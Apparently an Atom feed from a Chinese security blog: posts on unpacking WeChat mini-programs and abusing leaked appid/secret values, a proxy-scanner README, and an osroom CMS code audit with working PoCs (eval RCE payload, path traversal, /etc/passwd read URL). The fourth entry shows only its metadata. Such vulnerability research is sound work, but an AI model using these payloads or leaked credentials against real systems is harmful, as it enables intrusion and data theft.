<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Misaki&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://misakikata.github.io/"/>
  <updated>2021-03-24T07:34:27.784Z</updated>
  <id>https://misakikata.github.io/</id>
  
  <author>
    <name>Misaki</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>微信小程序解包</title>
    <link href="https://misakikata.github.io/2021/03/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%A7%A3%E5%8C%85/"/>
    <id>https://misakikata.github.io/2021/03/微信小程序解包/</id>
    <published>2021-03-24T07:34:27.000Z</published>
    <updated>2021-03-24T07:34:27.784Z</updated>
    
    <content type="html"><![CDATA[<h2 id="认识微信小程序"><a href="#认识微信小程序" class="headerlink" title="认识微信小程序"></a>认识微信小程序</h2><p>此处使用Windows版微信做介绍，但是Windows版和手机版稍微有点区别。先去获取一个Windows版的微信小程序包。默认位置在：<code>C:\Users\user\Documents\WeChat Files\Applet</code>。移动端的包在<code>/data/data/com.tencent.mm/MicroMsg/&#123;id&#125;/appbrand/pkg</code>，此处没有移动设备，不使用移动设备做演示。</p><p>目录下有一堆wx开头的目录，这些ID就是对应的小程序ID，可以在访问小程序抓包中获取到，如果懒得抓包也不知道小程序ID就把这些删掉，重新访问会再次下载，根据日期来找到对应的包即可。</p><p>Windows版的小程序包自动在外部加了一层的加密，我们看到的包名统一为：<code>__APP__.wxapkg</code>。我们可以看到这样的文件头，V1MMWX标识就是加密后添加的标识。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210322151852954.png" alt="image-20210322151852954"></p><p>这个是需要解密的，借助大佬的go语音项目来解密：<code>https://github.com/BlackTrace/pc_wxapkg_decrypt</code>，同时也有编译后的程序，直接用即可。</p><p>那Windows版的小程序的加密流程为：</p><ol><li>首先pbkdf2生成AES的key。利用微信小程序id字符串为pass，salt为<strong>saltiest</strong> 迭代次数为1000。调用pbkdf2生成一个32位的key</li><li>首先取原始的wxapkg的包得前1023个字节通过AES通过1生成的key和iv(<strong>the iv: 16 bytes</strong>),进行加密</li><li>接着利用微信小程序id字符串的倒数第2个字符为xor key，依次异或1023字节后的所有数据，如果微信小程序id小于2位，则xorkey 为 <strong>0x66</strong></li><li>把AES加密后的数据（1024字节）和xor后的数据一起写入文件，并在文件头部添加<strong>V1MMWX</strong>标识</li></ol><p>解密后，就能获得一个以微信小程序ID命令的包，这个包就是需要解析来获取小程序源码的包。先来看一下小程序的结构。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210322152633592.png" alt="image-20210322152633592"></p><p>从十六进制中可以看到，旁边的文件目录文件。这种包并非一个压缩格式的包，而是一个二进制的包，需要特定的方法解包。</p><h2 id="小程序解包"><a href="#小程序解包" class="headerlink" title="小程序解包"></a>小程序解包</h2><p>使用工具：<a href="https://gist.github.com/Integ/bcac5c21de5ea35b63b3db2c725f07ad">https://gist.github.com/Integ/bcac5c21de5ea35b63b3db2c725f07ad</a></p><p>执行：<code>python3 python.py wxid.wxapkg</code>，可以看到目录下生成的微信id的目录包。</p><p>或者使用：<a href="https://github.com/xuedingmiaojun/wxappUnpacker">https://github.com/xuedingmiaojun/wxappUnpacker</a>，一个nodejs的项目。提供Windows的安装版。</p><p>获取到小程序的源码格式包的时候，跟原来的源码还是稍微有点区别。在一级目录下，可以看到有三个文件，实际上不同的解包工具看到的不一样，有时候是四个文件。</p><pre class="line-numbers language-none"><code class="language-none">app-service.jsapp-config.jsonpage-frame.html&#x2F;&#x2F;app.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>app-service.js</code>是所以js的汇总，只是微信把js都压缩到这个js内。</p><p><code>app-config.json</code>: 小程序工程 <code>app.json</code> 以及各个页面的 JSON 配置文件汇总，可直接查看；</p><p><code>page-frame.html</code>: 所有页面的 <code>.wxml</code> 和 <code>app.wxss</code> 样式文件的汇总；</p><p><code>*.html</code>: 包含每个页面对应的 <code>.wxss</code> 信息，可读性较好；</p><p><code>static</code>: 各类图片、音频等资源文件。</p><p>获取解包后，小程序源码有什么用？</p><h2 id="小程序内的信息泄露"><a href="#小程序内的信息泄露" class="headerlink" title="小程序内的信息泄露"></a>小程序内的信息泄露</h2><p>有一部分开发者会把Appid和Secret放在小程序内请求，比如如下的开发者</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210322161110075.png"></p><p>如果这个appid和secret可以使用，就能获取到seesion_key。借用官方的登陆流程。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/api-login.2fcc9f35.jpg" alt="img"></p><p>所以需要code和appid还有secret，code如何获取，只需要使用带有登陆功能的点，需要触发了wx.login()功能，点击登陆抓包即可。</p><p>一般打开小程序的时候就有流量交互了。比如，但这个code只能使用一次</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210322162950522.png" alt="image-20210322162950522"></p><p>构造一个请求，查看小程序官方文档：<a href="https://developers.weixin.qq.com/miniprogram/dev/api-backend/open-api/login/auth.code2Session.html">https://developers.weixin.qq.com/miniprogram/dev/api-backend/open-api/login/auth.code2Session.html</a></p><pre class="line-numbers language-none"><code class="language-none">curl https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;sns&#x2F;jscode2session?appid&#x3D;wxxxxx&amp;secret&#x3D;568wdxxx&amp;js_code&#x3D;041xxxx&amp;grant_type&#x3D;authorization_code<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了方便，此处使用云函数功能测试，需要小程序开启云函数。使用python的第三方包<code>python-weixin</code>。但云函数功能不一定都开放，需要小程序开放才能查询。</p><pre class="line-numbers language-none"><code class="language-none">from os import environ, pathfrom weixin import WxAppCloudAPI​appid &#x3D; environ.get(&quot;WXAPP_APPID&quot;, &quot;wx88xxxxx&quot;)secret &#x3D; environ.get(&quot;WXAPP_SECRET&quot;, &quot;56xxxxx&quot;)env &#x3D; &quot;test-id&quot;​example_db &#x3D; path.abspath(path.join(path.dirname(__file__), &quot;.&#x2F;example_db&quot;))app_cloud &#x3D; WxAppCloudAPI(    appid&#x3D;appid, app_secret&#x3D;secret, grant_type&#x3D;&quot;client_credential&quot;)token &#x3D; app_cloud.client_credential_for_access_token().get(&quot;access_token&quot;)print(token)​cloud_api &#x3D; WxAppCloudAPI(access_token&#x3D;token)# 获取库的集合信息db_info &#x3D; cloud_api.db_collection_info(json_body&#x3D;&#123;&quot;env&quot;: env, &quot;limit&quot;: 10&#125;)print(db_info)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据包的wiki来利用云函数操作小程序，文档：<a href="https://github.com/gusibi/python-weixin/wiki/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BA%91%E5%BC%80%E5%8F%91">https://github.com/gusibi/python-weixin/wiki/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BA%91%E5%BC%80%E5%8F%91</a></p><h3 id="利用accesstoken"><a href="#利用accesstoken" class="headerlink" title="利用accesstoken"></a>利用accesstoken</h3><p>获取session_key是用户数据的加密密钥，那accesstoken就是操作小程序的调用凭证。</p><p>先获取accesstoken，也可以利用上面提到的代码来获取accesstoken。</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;cgi-bin&#x2F;token?grant_type&#x3D;client_credential&amp;appid&#x3D;APPID&amp;secret&#x3D;APPSECRET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取到token后可以利用官方的接口操作小程序来查询等操作，比如查询最近一天的访问</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;api.weixin.qq.com&#x2F;datacube&#x2F;getweanalysisappidvisitpage?access_token&#x3D;ACCESS_TOKENdata &#x3D; &#123;&quot;begin_date&quot; : &quot;20170313&quot;,&quot;end_date&quot; : &quot;20170313&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其他查询接口查看：<a href="https://developers.weixin.qq.com/miniprogram/dev/api-backend/open-api/access-token/auth.getAccessToken.html">https://developers.weixin.qq.com/miniprogram/dev/api-backend/open-api/access-token/auth.getAccessToken.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;认识微信小程序&quot;&gt;&lt;a href=&quot;#认识微信小程序&quot; class=&quot;headerlink&quot; title=&quot;认识微信小程序&quot;&gt;&lt;/a&gt;认识微信小程序&lt;/h2&gt;&lt;p&gt;此处使用Windows版微信做介绍，但是Windows版和手机版稍微有点区别。先去获取一个Windo
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>又叒一个代理扫描平台</title>
    <link href="https://misakikata.github.io/2021/01/%E5%8F%88%E5%8F%92%E4%B8%80%E4%B8%AA%E4%BB%A3%E7%90%86%E6%89%AB%E6%8F%8F%E5%B9%B3%E5%8F%B0/"/>
    <id>https://misakikata.github.io/2021/01/又叒一个代理扫描平台/</id>
    <published>2021-01-13T08:25:40.000Z</published>
    <updated>2021-01-13T08:35:48.644Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于项目"><a href="#关于项目" class="headerlink" title="关于项目"></a>关于项目</h2><ol><li> 项目是一个代理扫描器，现有的代理扫描平台有xray，w13scan等，只是我希望关于SQL注入的使用sqlmap来检测执行，所以就有了这个平台，本质上和GroudScan是差不多的，只是把w13scan也加入到其中来检测别的漏洞。</li><li> 同时也期望这个东西能做到代理扫描上的统一化，在实际工作中，开发测试对于新功能并不会实时进行安全申报，所以希望平台化的被动扫描可以帮助实现安全的加固。</li><li> 地址：<a href="https://github.com/MisakiKata/mitescan">https://github.com/MisakiKata/mitescan</a></li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li>环境使用MySQL，建议手动调整连接超时时间，代码会检测连接是否超时，但是可以调整超时来延缓长连接。不修改本质上也没事。</li><li>安装，基于python3.7</li></ol><pre class="line-numbers language-none"><code class="language-none">mitmproxyapschedulerdjango-apschedulerdjango&#x3D;&#x3D;2.2.10django-simpleuiPyMySQLsecretsasn1crypto&#x3D;&#x3D;0.24.0certifi&#x3D;&#x3D;2019.6.16cffi&#x3D;&#x3D;1.12.3chardet&#x3D;&#x3D;3.0.4colorama&#x3D;&#x3D;0.4.1cowpy&#x3D;&#x3D;1.1.0cryptography&#x3D;&#x3D;2.7cssselect&#x3D;&#x3D;1.1.0idna&#x3D;&#x3D;2.8lxml&#x3D;&#x3D;4.5.0pycparser&#x3D;&#x3D;2.19pyjsparser&#x3D;&#x3D;2.7.1pyOpenSSL&#x3D;&#x3D;18.0.0PySocks&#x3D;&#x3D;1.7.1requests&#x3D;&#x3D;2.24.0requests-toolbelt&#x3D;&#x3D;0.9.1six&#x3D;&#x3D;1.12.0tld&#x3D;&#x3D;0.9.3urllib3&#x3D;&#x3D;1.25.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li> 代理模块使用mitmproxy，如果需要代理https，请在开启代理后访问地址<code>http://mitm.it/</code>下载证书，默认代理为<code>0.0.0.0:18088</code>。如需修改在myproxy/myproxys.py中修改。</li><li> 需要开启sqlmapapi</li></ol><pre class="line-numbers language-none"><code class="language-none">python sqlmapapi.py -s <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li> 为了避免流量数据堆积，只显示最近三天的流量，检索也是按照最近三天检索，如果需要修改<code>apps/proxy/views.py</code>中修改<code>timedelta(days=3)</code>为想要的天数。</li></ol><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>配置setting的数据库信息</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">python manage.py makemigrationspython manage.py migrate python manage.py createsuperuserpython manage.py runserver 0.0.0.0:8000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>访问地址ip:8000即可，如需维持进程，可以使用supervisor。</p><h4 id="监控前台"><a href="#监控前台" class="headerlink" title="监控前台"></a>监控前台</h4><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210112111910805.png" alt="image-20210112111910805"></p><h4 id="监控选项"><a href="#监控选项" class="headerlink" title="监控选项"></a>监控选项</h4><p>注入的结果使用的<code>apscheduler</code>任务框架来定时检索，默认是一分钟执行一次。所以请开启，不然不会检查是否注入完成。如果需要修改时间请到<code>apps/sqli/views.py</code>中，修改<code>minutes=1</code>为需要的分钟。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210112112450179.png" alt="image-20210112112450179"></p><h4 id="代理数据"><a href="#代理数据" class="headerlink" title="代理数据"></a>代理数据</h4><p>关于搜索，需要输入请求的地址和端口来检测，也可以只输入一个值，但如果是ip加端口的形式，需要分开来一起搜索。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210112111940503.png" alt="image-20210112111940503"></p><h4 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h4><p>请在其中添加修改需要过滤的代理请求关键词，所有添加的参数都会按照并集来处理。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210112111959302.png" alt="image-20210112111959302"></p><h4 id="SQL注入监控"><a href="#SQL注入监控" class="headerlink" title="SQL注入监控"></a>SQL注入监控</h4><p>菜单下的注入设置同上。等待已完成查看结果即可，需要右上角刷新页面</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210112112110829.png" alt="image-20210112112110829"></p><h4 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h4><p>此漏洞为w13scan扫描结果漏洞展示</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210112112302619.png" alt="image-20210112112302619"></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>此项目主要是融合利用，存在的已知问题是：稳定性暂时没有经过大流量的测试，只是单纯的个人使用无误。如果存在其他问题，还请表哥issue。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;关于项目&quot;&gt;&lt;a href=&quot;#关于项目&quot; class=&quot;headerlink&quot; title=&quot;关于项目&quot;&gt;&lt;/a&gt;关于项目&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt; 项目是一个代理扫描器，现有的代理扫描平台有xray，w13scan等，只是我希望关于SQL注入的使用sqlma
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="python" scheme="https://misakikata.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--osroom</title>
    <link href="https://misakikata.github.io/2020/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-osroom/"/>
    <id>https://misakikata.github.io/2020/11/代码审计-osroom/</id>
    <published>2020-11-20T07:24:45.000Z</published>
    <updated>2020-11-20T07:26:48.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="osroom"><a href="#osroom" class="headerlink" title="osroom"></a>osroom</h2><p>这个cms很有意思，从漏洞和程序的写法上，很适合用来入门学习，漏洞的一些形式相比来说，也比较多一点。</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p><code>apps\utils\format\obj_format.py</code></p><p>如下，文件中采用了eval来转换字符串对象，当json.loads转换失败的时候，则直接使用eval来转换。</p><pre class="line-numbers language-none"><code class="language-none">def json_to_pyseq(tjson):    &quot;&quot;&quot;    json to python sequencer    :param json:    :return:    &quot;&quot;&quot;    if tjson in [None, &quot;None&quot;]:        return None    elif not isinstance(tjson, (list, dict, tuple)) and tjson !&#x3D; &quot;&quot;:        if isinstance(tjson, (str, bytes)) and tjson[0] not in [&quot;&#123;&quot;, &quot;[&quot;, &quot;(&quot;]:            return tjson        elif isinstance(tjson, (int, float)):            return tjson        try:            tjson &#x3D; json.loads(tjson)        except BaseException:            tjson &#x3D; eval(tjson)        else:            if isinstance(tjson, str):                tjson &#x3D; eval(tjson)    return tjson<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>转到一个使用此方法的功能，例如<code>apps\modules\audit\process\rules.py</code></p><p>删除规则处，传入一个ids参数，原参数值是一个hash值，但是可以修改为python代码。</p><pre class="line-numbers language-none"><code class="language-none">def audit_rule_delete():    ids &#x3D; json_to_pyseq(request.argget.all(&#39;ids&#39;, []))    if not isinstance(ids, list):        ids &#x3D; json.loads(ids)    for i, tid in enumerate(ids):        ids[i] &#x3D; ObjectId(tid)    r &#x3D; mdbs[&quot;sys&quot;].db.audit_rules.delete_many(&#123;&quot;_id&quot;: &#123;&quot;$in&quot;: ids&#125;&#125;)    if r.deleted_count &gt; 0:        data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;Delete the success,&#123;&#125;&quot;).format(            r.deleted_count), &quot;msg_type&quot;: &quot;s&quot;, &quot;custom_status&quot;: 204&#125;    else:        data &#x3D; &#123;            &quot;msg&quot;: gettext(&quot;Delete failed&quot;),            &quot;msg_type&quot;: &quot;w&quot;,            &quot;custom_status&quot;: 400&#125;    return data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数POC：<code> &#123;123:__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#125;</code>，查看终端输出。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112124711645.png" alt="image-20201112124711645"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112121033287.png" alt="image-20201112121033287"></p><p>只要涉及到ids参数的都存在此问题，比如另一个类别删除功能。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112133809406.png" alt="image-20201112133809406"></p><p>在用户登陆的判断中，也对传入的参数<code>code_url_obj</code>执行了此方法，所以存在一个前台的RCE</p><p><code>apps\modules\user\process\online.py</code></p><pre class="line-numbers language-none"><code class="language-none">code_url_obj &#x3D; json_to_pyseq(request.argget.all(&#39;code_url_obj&#39;, &#123;&#125;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112162057637.png" alt="image-20201112162057637"></p><h3 id="文件覆盖"><a href="#文件覆盖" class="headerlink" title="文件覆盖"></a>文件覆盖</h3><p><code>apps\utils\upload\file_up.py</code></p><p>ps: 此问题没有复现，理论上存在。</p><p>代码描述了一种上传typroa图像base64后处理来保存写入文件的方式，其中后缀是解析typroa图像base64开头得到，例如</p><p><code>data:image/jpg;base64,</code>获得后缀为jpg，在后续的文件明拼接中，文件名被以时间戳和UUID重写构造，但是后缀可控，可以写入<code>..\..\</code>形式的遍历<code>data:image/jpg\..\..\..\..\tmp;base64</code></p><pre class="line-numbers language-none"><code class="language-none">def fileup_base_64(uploaded_files, file_name&#x3D;None, prefix&#x3D;&quot;&quot;):    &quot;&quot;&quot;     文件以base64编码上传上传    :param uploaded_files: 数组    :param bucket_var: 保存typroa图像服务器空间名的变量名, 如AVA_B    :param file_name:    :return:    &quot;&quot;&quot;    if not uploaded_files:        return None    keys &#x3D; []    for file_base in uploaded_files:        if file_base:            # data:image&#x2F;jpeg            file_format &#x3D; file_base.split(&quot;;&quot;)[0].split(&quot;&#x2F;&quot;)[-1]            imgdata &#x3D; base64.b64decode(file_base.split(&quot;,&quot;)[-1])            if file_name:                filename &#x3D; &#39;&#123;&#125;.&#123;&#125;&#39;.format(file_name, file_format)            else:                filename &#x3D; &#39;&#123;&#125;_&#123;&#125;.&#123;&#125;&#39;.format(                    time_to_utcdate(                        time_stamp&#x3D;time.time(),                        tformat&#x3D;&quot;%Y%m%d%H%M%S&quot;),                    uuid1(),                    file_format)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入后可以造成一种保存文件到其他目录的效果，这种遍历在Linux下是不允许的，但在Windows下可执行，win支持及<code>../</code>和<code>..\</code>，还可以文件结尾的回退遍历，所以在Windows下可以造成覆写。</p><p>由于兼容性，Windows下有个别的包兼容有问题，并没有复现，附一张Linux的目录构造图</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112155343443.png" alt="image-20201112155343443"></p><h3 id="上传文件覆盖"><a href="#上传文件覆盖" class="headerlink" title="上传文件覆盖"></a>上传文件覆盖</h3><p>如果上面那个不是很清楚，这个就比较明显了，插件上传功能中。</p><p><code>apps\modules\plug_in_manager\process\manager.py</code></p><pre class="line-numbers language-none"><code class="language-none">def upload_plugin():    &quot;&quot;&quot;    插件上传    :return:    &quot;&quot;&quot;    file &#x3D; request.files[&quot;upfile&quot;]    file_name &#x3D; os.path.splitext(file.filename)         #(&#39;123&#39;,&#39;.zip&#39;)    filename &#x3D; os.path.splitext(file.filename)[0]         #123    extension &#x3D; file_name[1]                           #.zip    if not extension.strip(&quot;.&quot;).lower() in [&quot;zip&quot;]:        data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;File format error, please upload zip archive&quot;),                &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 401&#125;        return data    if not os.path.exists(PLUG_IN_FOLDER):            #osroom&#x2F;apps&#x2F;plugins        os.makedirs(PLUG_IN_FOLDER)    fpath &#x3D; os.path.join(PLUG_IN_FOLDER, filename)   ##osroom&#x2F;apps&#x2F;plugins&#x2F;123    if os.path.isdir(fpath) or os.path.exists(fpath):        if mdbs[&quot;sys&quot;].db.plugin.find_one(                &#123;&quot;plugin_name&quot;: filename, &quot;is_deleted&quot;: &#123;&quot;$in&quot;: [0, False]&#125;&#125;):            # 如果插件没有准备删除标志            data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;The same name plugin already exists&quot;),                    &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 403&#125;            return data        else:            # 否则清除旧的插件            shutil.rmtree(fpath)            mdbs[&quot;sys&quot;].db.plugin.update_one(&#123;&quot;plugin_name&quot;: filename&#125;, &#123;                                         &quot;$set&quot;: &#123;&quot;is_deleted&quot;: 0&#125;&#125;)    # 保存主题    save_file &#x3D; os.path.join(&quot;&#123;&#125;&#x2F;&#123;&#125;&quot;.format(PLUG_IN_FOLDER, file.filename))     ##osroom&#x2F;apps&#x2F;plugins&#x2F;123.zip    file.save(save_file)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传文件后分割文件和后缀，判断插件是否存在以及是否清理就插件，在下面保存的时候，直接使用了上传的参数名做拼接，导致可以被跨目录保存，比如文件应该保存到<code>osroom/apps/plugins/</code>下，上传如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201113142316180.png" alt="image-20201113142316180"></p><p>我们在系统查看</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201113142402087.png" alt="image-20201113142402087"></p><h3 id="路径跳转"><a href="#路径跳转" class="headerlink" title="路径跳转"></a>路径跳转</h3><p><code>apps\modules\user\process\sign_in.py</code></p><p>ps：此问题影响较小，当作分析即可</p><p>在代码中存在一个获取值的参数<code>next</code>，这个参数是登陆的时候默认没有存在，可能是为了跳转登陆留下的参数。参数值为任意值的时候，返回的<code>to_url</code>的值就为参数值。</p><pre class="line-numbers language-none"><code class="language-none">def p_sign_in(        username,        password,        code_url_obj,        code,        remember_me,        use_jwt_auth&#x3D;0):    &quot;&quot;&quot;    用户登录函数    :param adm:    :return:    &quot;&quot;&quot;    data &#x3D; &#123;&#125;    if current_user.is_authenticated and username in [current_user.username,                                                      current_user.email,                                                      current_user.mphone_num]:        data[&#39;msg&#39;] &#x3D; gettext(&quot;Is logged in&quot;)        data[&quot;msg_type&quot;] &#x3D; &quot;s&quot;        data[&quot;custom_status&quot;] &#x3D; 201        data[&#39;to_url&#39;] &#x3D; request.argget.all(            &#39;next&#39;) or get_config(&quot;login_manager&quot;, &quot;LOGIN_IN_TO&quot;)        return data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在前端js中<code>apps\admin_pages\pages\sign-in.html</code></p><p>直接获取响应的data的to_url进行跳转，类似于统一登陆中的任意域跳转的问题。</p><pre class="line-numbers language-none"><code class="language-none">var result &#x3D; osrHttp(&quot;PUT&quot;,&quot;&#x2F;api&#x2F;sign-in&quot;, d);      result.then(function (r) &#123;             if(r.data.msg_type&#x3D;&#x3D;&quot;s&quot;)&#123;                 window.location.href &#x3D; r.data&#x2F;to_url;             &#125;else if(r.data.open_img_verif_code)&#123;                 get_imgcode();             &#125;      &#125;).catch(function (r) &#123;         if(r.data.open_img_verif_code)&#123;             get_imgcode();         &#125;      &#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p><code>apps\modules\theme_setting\process\static_file.py</code></p><p>读取静态文件模板的时候，直接使用了请求的参数进行拼接访问，导致可以任意读取文件</p><pre class="line-numbers language-none"><code class="language-none">def get_static_file_content():    &quot;&quot;&quot;    获取静态文件内容, 如html文件    :return:    &quot;&quot;&quot;    filename &#x3D; request.argget.all(&#39;filename&#39;, &quot;index&quot;).strip(&quot;&#x2F;&quot;)    file_path &#x3D; request.argget.all(&#39;file_path&#39;, &quot;&quot;).strip(&quot;&#x2F;&quot;)    theme_name &#x3D; request.argget.all(&quot;theme_name&quot;)    s, r &#x3D; arg_verify([(gettext(&quot;theme name&quot;), theme_name)], required&#x3D;True)    if not s:        return r    path &#x3D; os.path.join(        THEME_TEMPLATE_FOLDER, theme_name)    file &#x3D; &quot;&#123;&#125;&#x2F;&#123;&#125;&#x2F;&#123;&#125;&quot;.format(path, file_path, filename)    if not os.path.exists(file) or THEME_TEMPLATE_FOLDER not in file:        data &#x3D; &#123;&quot;msg&quot;: gettext(&quot;File not found,&#39;&#123;&#125;&#39;&quot;).format(file),                &quot;msg_type&quot;: &quot;w&quot;, &quot;custom_status&quot;: 404&#125;    else:        with open(file) as wf:            content &#x3D; wf.read()        data &#x3D; &#123;            &quot;content&quot;: content,            &quot;file_relative_path&quot;: file_path.replace(                path,                &quot;&quot;).strip(&quot;&#x2F;&quot;)&#125;    return data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造POC：<code>http://192.168.120.128:5000/api/admin/static/file?file_path=pages/account/settings/../../../../../../../../etc&amp;filename=passwd&amp;theme_name=osr-theme-w</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201112174207578.png" alt="image-20201112174207578"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;osroom&quot;&gt;&lt;a href=&quot;#osroom&quot; class=&quot;headerlink&quot; title=&quot;osroom&quot;&gt;&lt;/a&gt;osroom&lt;/h2&gt;&lt;p&gt;这个cms很有意思，从漏洞和程序的写法上，很适合用来入门学习，漏洞的一些形式相比来说，也比较多一点。&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="python" scheme="https://misakikata.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--Plone</title>
    <link href="https://misakikata.github.io/2020/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Plone/"/>
    <id>https://misakikata.github.io/2020/11/代码审计-Plone/</id>
    <published>2020-11-18T01:32:02.000Z</published>
    <updated>2020-11-18T01:35:28.000Z</updated>
    
